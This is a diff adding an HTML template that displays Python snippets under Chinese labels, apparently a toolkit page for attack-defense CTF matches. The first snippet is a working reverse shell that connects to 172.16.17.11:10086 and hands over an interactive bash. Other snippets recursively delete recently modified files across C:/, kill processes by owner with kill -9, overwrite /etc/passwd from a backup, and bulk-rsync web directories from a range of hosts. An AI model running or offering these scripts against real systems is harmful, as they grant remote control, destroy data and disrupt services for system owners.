@@ -1,0 +1,183 @@
+<div class="am-form">
+
+    <div class="am-form-group">
+        <label for="pc_src">Python正向连接（linux）</label>
+        <textarea debounce="500" rows="7">
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("172.16.17.11", 10086))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+        </textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_zlib">Python自动删除修改时间大于脚本执行时间的文件，WN为白名单，最后一行指定目录</label>
+        <textarea id="pc_zlib" debounce="500" rows="7">
+# coding:utf-8
+
+import os
+import time
+from os.path import join
+
+BC =  time.time()
+WN = ['infoconfig.php', 'Template.class.php']
+
+def arm(d):
+    for i in os.listdir(d):
+        fn = join(d, i)
+        stat = os.stat(fn)
+
+        if os.path.isdir(fn):
+            arm(fn)
+        else:
+            if BC and stat.st_ctime > BC:
+                 if not i in WN:
+                     os.remove(fn)
+
+
+arm("C:/")</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_oneline">Python杀死所有非指定用户的服务程序（Linux限定，WHITE_USER）</label>
+        <textarea id="pc_oneline" debounce="500" rows="7">
+# coding:utf-8
+# 杀死所有非指定用户的服务程序
+
+import re
+import os
+
+KILL = True
+WHITE_USER = ['.']
+
+pid_lst = []
+pid = int(os.getpid())
+
+while pid:
+    pid_lst.append(pid)
+    pid = int(os.popen('cat /proc/%s/status | grep "PPid"' % pid).read()[5:])
+
+def k():
+    data = os.popen('netstat -anp').read()
+    t,b = data.split('Active UNIX domain sockets (servers and established)')
+
+    t = t.split('\n')
+
+    lstk = []
+    print('=================')
+    for i in t[1:]:
+        ret = re.match(r'(\S+)\s+' * 6 + '(?:(\S+))?', i)
+        if ret:
+            if ret.group(6) == 'ESTABLISHED':
+                lstk.append(ret.group(7))
+                print(ret.groups())
+
+    print('=================')
+
+    if KILL:
+        print('Search for kill:')
+        for i in lstk:
+            if not i.startswith('-'):
+                pid, program = i.split(r'/')
+                if not int(pid) in pid_lst:
+                    if os.popen('ps u -p %s' % pid).read().split('\n')[1].split(' ')[0] in WHITE_USER:
+                        print(i)
+                        os.system('kill -9 %s' % pid)
+
+        print('KILLED')
+    return
+
+k()</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Python自动重置passwd</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+# coding:utf-8
+
+import time
+import os
+
+CTIME = time.time()
+
+def rp():
+    stat = os.stat('/etc/passwd')
+
+    if stat.st_ctime > CTIME:
+         os.system(r'\cp -rf /root/passwd /etc/passwd')
+
+rp()</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Python批量rsync</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+#coding:utf-8
+
+import os
+
+def get(num):
+    os.system("mkdir -p ./%s" % num)
+    os.popen('rsync -avz 172.16.%s.103::360web ./%s' % num).read()
+
+for i in range(10, 19):
+    get(i)</textarea>
+    </div>
+
+
+    <div class="am-form-group">
+        <label for="pc_src">Python Daemon守护进程 </label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+#coding:utf-8
+
+import re, os, time, signal
+
+kill_pause = False
+arm_pause = False
+
+interval = 0.5
+live_time = 10*60*60
+pid = int(os.getpid())
+start_time = time.time()
+
+def daemon():
+    pid = os.fork()
+    if pid != 0:
+        os._exit(0)
+
+    while True:
+        _do_wtf()
+
+
+def on_term():
+    pass
+
+signal.signal(signal.SIGTERM, on_term)
+
+def _do_wtf():
+    reload_info()
+    # ...
+    time.sleep(interval)
+
+
+def reload_info():
+    if time.time() - start_time > live_time:
+        exit(0)
+
+    if os.path.exists('/root/_exit'):
+        exit(0)
+
+daemon()</textarea>
+    </div>
+
+    % if False:
+    <div class="am-form-group">
+        <label for="pc_src">源码</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7"></textarea>
+    </div>
+    % endif
+
+</div>
